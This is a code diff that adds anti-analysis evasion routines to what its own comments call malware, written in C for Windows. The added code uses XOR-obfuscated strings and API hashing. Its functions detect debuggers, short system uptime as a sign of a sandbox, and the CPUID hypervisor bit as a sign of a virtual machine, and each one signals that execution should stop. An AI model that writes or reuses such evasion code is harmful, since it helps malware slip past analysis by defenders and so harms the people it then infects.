@@ -1,6 +1,13 @@
 #include "config.h"
 #include "evasion.h"
 #include <stdio.h>
+#include <intrin.h>
+
+// --- TYPEDEFS per API Hashing ---
+typedef HANDLE (WINAPI *pCreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
+typedef DWORD (WINAPI *pGetLastError)(void);
+typedef BOOL (WINAPI *pIsDebuggerPresent)(void);
+typedef ULONGLONG (WINAPI *pGetTickCount64)(void);
 
 void xor_crypt(char *data, size_t data_len, const char *key, size_t key_len) {
     if (data_len == 0 || key_len == 0) {
@@ -58,6 +65,82 @@ bool check_mutex() {
 
     // NOTE: Do NOT close hMutex here! 
     // we want it to remain open as long as the malware is alive.
+    return true;
+}
+
+bool check_debugger() {
+    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
+
+    char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
+
+    // API hashes
+    DWORD hash_IsDebuggerPresent = 0xE6A24847; // djb2 for "IsDebuggerPresent"
+
+    // kernel32.dll
+    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
+    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
+    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
+
+    if (!hKernel32) return false;
+
+    // --- dynamic resolution via hashing
+    pIsDebuggerPresent fnIsDebuggerPresent = (pIsDebuggerPresent) get_api_by_hash(hKernel32, hash_IsDebuggerPresent);
+
+    if (!fnIsDebuggerPresent) return false;
+
+    // check if a debugger is attached
+    if (fnIsDebuggerPresent()) {
+        return false; // debugger found, kill execution
+    }
+
+    return true;
+}
+
+bool check_uptime() {
+    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
+
+    char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
+
+    // API hashes
+    DWORD hash_GetTickCount64 = 0x614DB023;    // djb2 for "GetTickCount64"
+
+    // kernel32.dll
+    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
+    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
+    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
+
+    if (!hKernel32) return false;
+
+    // --- dynamic resolution via hashing
+    pGetTickCount64 fnGetTickCount64 = (pGetTickCount64) get_api_by_hash(hKernel32, hash_GetTickCount64);
+
+    if (!fnGetTickCount64) return false;
+
+    // check system uptime
+    // NOTE: sandboxes often spin up VMs dynamically
+    // if uptime < 15 minutes (900000 ms), it's highly suspicious
+    ULONGLONG uptime = fnGetTickCount64();
+    if (uptime < 900000) {
+        return false; // probably a sandbox
+    }
+
+    return true;
+}
+
+bool check_vm() {
+    // send command '1' to CPUID
+    // cpuInfo array will contain EAX, EBX, ECX, EDX registers
+    int cpuInfo[4] = {0};
+    __cpuid(cpuInfo, 1);
+
+    // check the 31st bit of the ECX register (cpuInfo[2])
+    // if the bit is 1, a hypervisor is present
+    bool is_vm = (cpuInfo[2] >> 31) & 1;
+
+    if (is_vm) {
+        return false; // virtual machine detected, kill execution
+    }
+
     return true;
 }
 
